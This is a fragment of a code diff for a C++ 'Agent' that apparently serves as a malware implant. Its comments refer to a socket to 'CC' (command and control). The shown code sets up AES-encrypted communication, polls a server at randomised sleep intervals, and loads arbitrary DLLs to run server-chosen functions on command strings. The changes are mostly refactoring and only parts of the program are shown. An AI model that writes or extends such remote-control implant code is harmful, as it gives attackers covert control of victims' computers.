@@ -31,21 +31,13 @@ Agent::Agent()
 	aes = AES_crypto(sharedKey);
 
 	byte key[32];
-	/*char * str = (char *)sharedKey.substr(0, 32).c_str();
-	for (size_t i = 0; i < 32; i++)
-	{
-		key[i] = static_cast<unsigned char>(str[i]);
-	}*/
-	/*memcpy(key, sharedKey.substr(0, 32).data(), 32);
-	mbedtls_aes_setkey_enc(&aes, key, 256);*/
-	
 
 	thread t1(&Agent::CreateNewSymetricKeyWithThread, this);
 	t1.detach();
-	/*thread t2(&Agent::GetRequestFromServer, this);
-	t2.detach();*/
+	
 	GetRequestFromServer();
 }
+
 /*
 	Create socket to CC
 */
@@ -205,8 +197,9 @@ void Agent::GetRequestFromServer()
 
 			Sleep(r * 30 * 1000);
 		}
-		catch (...)
+		catch (exception &e)
 		{
+			std::exception_ptr p = std::current_exception();
 			break;
 		}
 	}
@@ -311,15 +304,14 @@ string Agent::runDynamicFunction(string library, string function, string cmd)
 {
 	HINSTANCE hinstDLL = LoadLibrary(library.c_str());
 	LPGETNUMBER func = (LPGETNUMBER)GetProcAddress(hinstDLL, function.c_str());
+	string res;
 	if (func != NULL)
 	{
-		string res = func(cmd);
-		return res;
+		res = func(cmd);	
 	}
-
 	FreeLibrary(hinstDLL);
-
-	return string();
+	cout << "free " << GetLastError() << endl;
+	return res;
 }
 
 /*
